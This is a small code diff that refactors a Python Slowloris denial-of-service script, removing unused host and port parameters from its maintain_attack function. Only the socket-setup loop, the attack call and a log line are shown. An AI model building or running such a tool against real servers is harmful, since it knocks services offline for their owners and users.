@@ -106,7 +106,7 @@ def initialize_sockets(target_host, target_port, num_sockets, sockets, log):
     for i in range(num_sockets):
         create_socket(target_host, target_port, i, sockets, log)
 
-def maintain_attack(sockets, pkt_count, target_host, target_port, log):
+def maintain_attack(sockets, pkt_count, log):
     while sockets:
         process_sockets(sockets, pkt_count, log)
         if not sockets:
@@ -129,7 +129,7 @@ def slowloris_attack(target_host, target_port, num_sockets=50):
     initialize_sockets(target_host, target_port, num_sockets, sockets, log)
 
     try:
-        maintain_attack(sockets, pkt_count, target_host, target_port, log)
+        maintain_attack(sockets, pkt_count, log)
     except KeyboardInterrupt:
         log.info(f"Slowloris attack stopped on {target_host}:{target_port}")
     finally:
